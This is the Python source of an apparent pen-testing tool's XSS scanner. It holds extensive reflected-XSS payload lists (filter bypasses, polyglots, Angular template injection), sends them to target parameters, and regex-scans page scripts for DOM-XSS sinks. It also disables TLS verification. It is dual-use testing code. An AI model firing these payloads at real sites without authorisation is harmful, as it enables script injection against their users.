"""
Jarwis AGI Pen Test - XSS Scanner (Advanced)
Detects Cross-Site Scripting vulnerabilities (A03:2021 - Injection)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import re
import html
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class AdvancedXSSScanner:
    """
    Advanced XSS Scanner with comprehensive payload library
    OWASP A03:2021 - Injection
    
    Attack vectors:
    - Reflected XSS
    - DOM-based XSS detection
    - Filter bypass techniques
    - Context-aware payloads
    - Polyglot payloads
    - Event handler based
    - SVG/MathML vectors
    - Template injection XSS
    """
    
    # Unique marker for detection
    XSS_MARKER = 'jarwisxss'
    
    # Basic XSS payloads
    BASIC_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '"><img src=x onerror=alert(1)>',
    ]
    
    # Context-specific payloads
    CONTEXT_PAYLOADS = {
        # HTML context
        'html': [
            f'<script>alert("{XSS_MARKER}")</script>',
            f'<img src=x onerror=alert("{XSS_MARKER}")>',
            f'<svg/onload=alert("{XSS_MARKER}")>',
            f'<body onload=alert("{XSS_MARKER}")>',
            f'<input onfocus=alert("{XSS_MARKER}") autofocus>',
            f'<marquee onstart=alert("{XSS_MARKER}")>',
            f'<details open ontoggle=alert("{XSS_MARKER}")>',
            f'<video><source onerror=alert("{XSS_MARKER}")>',
            f'<audio src=x onerror=alert("{XSS_MARKER}")>',
            f'<math><maction xlink:href=javascript:alert("{XSS_MARKER}")>click',
        ],
        # Attribute context (breaking out)
        'attribute': [
            f'" onmouseover="alert(\'{XSS_MARKER}\')"',
            f"' onmouseover='alert(\"{XSS_MARKER}\")'",
            f'" onfocus="alert(\'{XSS_MARKER}\')" autofocus="',
            f"' onfocus='alert(\"{XSS_MARKER}\")' autofocus='",
            f'" onclick="alert(\'{XSS_MARKER}\')" x="',
            f"' onclick='alert(\"{XSS_MARKER}\")' x='",
        ],
        # JavaScript context
        'javascript': [
            f"';alert('{XSS_MARKER}');//",
            f'";alert("{XSS_MARKER}");//',
            f"'-alert('{XSS_MARKER}')-'",
            f'"-alert("{XSS_MARKER}")-"',
            f"`-alert('{XSS_MARKER}')-`",
            f"</script><script>alert('{XSS_MARKER}')</script>",
        ],
        # URL context
        'url': [
            f'javascript:alert("{XSS_MARKER}")',
            f'data:text/html,<script>alert("{XSS_MARKER}")</script>',
            f'vbscript:msgbox("{XSS_MARKER}")',
        ],
    }
    
    # Filter bypass payloads
    BYPASS_PAYLOADS = [
        # Case variations
        f'<ScRiPt>alert("{XSS_MARKER}")</sCrIpT>',
        f'<IMG SRC=x OnErRoR=alert("{XSS_MARKER}")>',
        
        # Null bytes
        f'<scr\x00ipt>alert("{XSS_MARKER}")</scr\x00ipt>',
        
        # HTML entities
        f'<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        
        # Unicode escapes
        f'<img src=x onerror=\\u0061lert("{XSS_MARKER}")>',
        
        # Double encoding
        f'%253Cscript%253Ealert("{XSS_MARKER}")%253C/script%253E',
        
        # Backticks (template literals)
        f'`<img src=x onerror=alert({XSS_MARKER})>`',
        
        # SVG vectors
        f'<svg><script>alert("{XSS_MARKER}")</script></svg>',
        f'<svg><animate onbegin=alert("{XSS_MARKER}") attributeName=x>',
        f'<svg><set onbegin=alert("{XSS_MARKER}") attributename=x>',
        
        # Unusual tags
        f'<isindex action=javascript:alert("{XSS_MARKER}")>',
        f'<form><button formaction=javascript:alert("{XSS_MARKER}")>X',
        
        # Breaking parsers
        f'<a href="javascript&colon;alert(\'{XSS_MARKER}\')">click</a>',
        f'<a href=javas&#99;ript:alert("{XSS_MARKER}")>click</a>',
        
        # Without parentheses
        f"<img src=x onerror=alert`{XSS_MARKER}`>",
        f'<img src=x onerror=alert&lpar;1&rpar;>',
        
        # CSS-based
        f'<style>@import"data:,*{{x:expression(alert({XSS_MARKER}))}}";</style>',
        
        # MathML
        f'<math><maction actiontype="statusline#http://evil?{XSS_MARKER}">click',
    ]
    
    # Polyglot payloads (work in multiple contexts)
    POLYGLOT_PAYLOADS = [
        f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert('{XSS_MARKER}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{XSS_MARKER}')//>\\x3e",
        f"'\"-->]]>*/</script></style></title></textarea></noscript></template><img src=x onerror=alert('{XSS_MARKER}')>",
        f"{{{{constructor.constructor('alert(\"{XSS_MARKER}\")')()}}}}",  # Angular
    ]
    
    # Common vulnerable parameters
    XSS_PARAMS = [
        'q', 'query', 'search', 's', 'keyword', 'term', 'name',
        'message', 'msg', 'text', 'content', 'body', 'comment',
        'title', 'subject', 'description', 'input', 'value',
        'url', 'redirect', 'next', 'return', 'callback', 'ref',
        'user', 'username', 'email', 'id', 'item', 'page',
        'error', 'err', 'warning', 'alert', 'success', 'info',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Advanced XSS scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:30]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_xss(session, ep_url)
            
            # Test common vulnerable paths
            xss_paths = [
                '/search', '/search.php', '/query',
                '/result', '/results', '/find',
                '/error', '/message', '/comment',
            ]
            
            for path in xss_paths:
                url = urljoin(base_url, path)
                await self._test_xss(session, url)
        
        logger.info(f"XSS scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_xss(self, session: aiohttp.ClientSession, url: str):
        """Test URL for XSS vulnerabilities"""
        
        # Test GET parameters
        for param in self.XSS_PARAMS[:15]:
            # Basic payloads first
            for payload in self.BASIC_PAYLOADS[:3]:
                await self._send_xss(session, url, param, payload, 'GET', 'basic')
            
            # Context-aware payloads
            for context, payloads in self.CONTEXT_PAYLOADS.items():
                for payload in payloads[:2]:
                    await self._send_xss(session, url, param, payload, 'GET', context)
            
            # Bypass payloads
            for payload in self.BYPASS_PAYLOADS[:5]:
                await self._send_xss(session, url, param, payload, 'GET', 'bypass')
        
        # Test POST parameters
        for param in self.XSS_PARAMS[:8]:
            for payload in self.BASIC_PAYLOADS[:2]:
                await self._send_xss(session, url, param, payload, 'POST', 'basic')
    
    async def _send_xss(self, session: aiohttp.ClientSession, url: str,
                       param: str, payload: str, method: str, xss_type: str):
        """Send XSS payload and analyze response"""
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            if method == 'GET':
                separator = '&' if '?' in url else '?'
                test_url = f"{url}{separator}{param}={quote(payload, safe='')}"
                
                async with session.get(test_url, headers=headers) as response:
                    body = await response.text()
                    content_type = response.headers.get('Content-Type', '')
                    
                    if self._check_xss_reflection(body, payload, content_type):
                        result = ScanResult(
                            id=f"XSS-{xss_type.upper()}-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title=f"Reflected XSS ({xss_type})",
                            description=f"Cross-site scripting via '{param}' parameter",
                            url=test_url,
                            method="GET",
                            parameter=param,
                            evidence=f"Payload reflected in response",
                            remediation="Encode all output. Use Content-Security-Policy.",
                            cwe_id="CWE-79",
                            poc=payload,
                            reasoning="XSS payload reflected without encoding"
                        )
                        self.results.append(result)
                        return
                        
            else:  # POST
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                data = {param: payload}
                
                async with session.post(url, data=data, headers=headers) as response:
                    body = await response.text()
                    content_type = response.headers.get('Content-Type', '')
                    
                    if self._check_xss_reflection(body, payload, content_type):
                        result = ScanResult(
                            id=f"XSS-POST-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title=f"POST-based Reflected XSS ({xss_type})",
                            description=f"Cross-site scripting via POST parameter '{param}'",
                            url=url,
                            method="POST",
                            parameter=param,
                            evidence=f"Payload reflected in response",
                            remediation="Encode all output. Use Content-Security-Policy.",
                            cwe_id="CWE-79",
                            poc=payload,
                            reasoning="POST XSS payload reflected"
                        )
                        self.results.append(result)
                        return
                        
        except Exception as e:
            logger.debug(f"XSS test error: {e}")
    
    def _check_xss_reflection(self, body: str, payload: str, content_type: str) -> bool:
        """Check if XSS payload is reflected without proper encoding"""
        
        # Skip non-HTML responses
        if 'text/html' not in content_type and 'application/xhtml' not in content_type:
            return False
        
        # Check for our marker
        if self.XSS_MARKER in body:
            # Check if in dangerous context
            dangerous_patterns = [
                f'<script>',
                f'onerror=',
                f'onload=',
                f'onclick=',
                f'onmouseover=',
                f'onfocus=',
                f'javascript:',
            ]
            return any(p in body.lower() for p in dangerous_patterns)
        
        # Check for payload reflection
        # Remove URL encoding for comparison
        decoded_payload = payload
        try:
            from urllib.parse import unquote
            decoded_payload = unquote(payload)
        except:
            pass
        
        # Check if payload appears unencoded
        if decoded_payload in body:
            # Verify it's not HTML encoded
            encoded_payload = html.escape(decoded_payload)
            if encoded_payload not in body:
                return True
        
        return False


class DOMXSSScanner:
    """
    Scans for DOM-based XSS vulnerabilities
    OWASP A03:2021 - Injection
    
    Identifies dangerous DOM sinks and sources
    """
    
    # DOM sinks (dangerous functions)
    DOM_SINKS = [
        'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
        'eval', 'setTimeout', 'setInterval', 'Function',
        'element.innerHTML', 'element.outerHTML', 'insertAdjacentHTML',
        'location', 'location.href', 'location.replace', 'location.assign',
        'jQuery.html', '$.html', 'jQuery.append', '$.append',
        'postMessage', 'setHTMLUnsafe',
    ]
    
    # DOM sources (user-controllable)
    DOM_SOURCES = [
        'location.hash', 'location.search', 'location.href',
        'document.URL', 'document.documentURI', 'document.baseURI',
        'document.referrer', 'document.cookie',
        'window.name', 'postMessage',
    ]
    
    # Patterns to detect vulnerable code
    VULN_PATTERNS = [
        r'innerHTML\s*=\s*[^;]*location',
        r'document\.write\s*\([^)]*location',
        r'eval\s*\([^)]*location',
        r'\$\(\s*["\'][^"\']*\+[^"\']*location',
        r'innerHTML\s*=\s*[^;]*\+\s*[^;]*',
        r'\.html\s*\([^)]*\+[^)]*\)',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting DOM XSS scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Scan main page
            await self._analyze_dom(session, base_url)
            
            # Scan discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:20]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._analyze_dom(session, ep_url)
        
        logger.info(f"DOM XSS scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _analyze_dom(self, session: aiohttp.ClientSession, url: str):
        """Analyze page JavaScript for DOM XSS patterns"""
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            async with session.get(url, headers=headers) as response:
                body = await response.text()
                
                # Find all script content
                scripts = self._extract_scripts(body)
                
                for script in scripts:
                    # Check for vulnerable patterns
                    vulns = self._check_dom_patterns(script, url)
                    self.results.extend(vulns)
                    
        except Exception as e:
            logger.debug(f"DOM analysis error: {e}")
    
    def _extract_scripts(self, html: str) -> List[str]:
        """Extract JavaScript from HTML"""
        scripts = []
        
        # Inline scripts
        script_pattern = r'<script[^>]*>(.*?)</script>'
        matches = re.findall(script_pattern, html, re.DOTALL | re.IGNORECASE)
        scripts.extend(matches)
        
        # Event handlers
        event_pattern = r'on\w+=["\']([^"\']+)["\']'
        matches = re.findall(event_pattern, html, re.IGNORECASE)
        scripts.extend(matches)
        
        return scripts
    
    def _check_dom_patterns(self, script: str, url: str) -> List[ScanResult]:
        """Check script for DOM XSS vulnerable patterns"""
        results = []
        
        for pattern in self.VULN_PATTERNS:
            if re.search(pattern, script, re.IGNORECASE):
                result = ScanResult(
                    id=f"DOM-XSS-{len(self.results)+len(results)+1}",
                    category="A03:2021 - Injection",
                    severity="medium",
                    title="Potential DOM-based XSS",
                    description="JavaScript code contains potentially unsafe DOM manipulation.",
                    url=url,
                    method="GET",
                    evidence=f"Pattern: {pattern[:50]}",
                    remediation="Use safe DOM APIs. Avoid innerHTML with user input.",
                    cwe_id="CWE-79",
                    reasoning="Dangerous sink used with potential user input"
                )
                results.append(result)
                break  # One finding per page
        
        # Check for source to sink flows
        for sink in self.DOM_SINKS[:10]:
            for source in self.DOM_SOURCES[:5]:
                pattern = f'{sink}[^;]*{source}'
                if re.search(pattern, script, re.IGNORECASE):
                    result = ScanResult(
                        id=f"DOM-XSS-FLOW-{len(self.results)+len(results)+1}",
                        category="A03:2021 - Injection",
                        severity="high",
                        title=f"DOM XSS: {source} → {sink}",
                        description=f"User input from {source} flows to dangerous sink {sink}.",
                        url=url,
                        method="GET",
                        evidence=f"Source: {source}, Sink: {sink}",
                        remediation="Sanitize data before using in dangerous sinks.",
                        cwe_id="CWE-79",
                        poc=f"Try URL with #{sink}=<script>alert(1)</script>",
                        reasoning=f"Data flow from {source} to {sink}"
                    )
                    results.append(result)
                    break
        
        return results
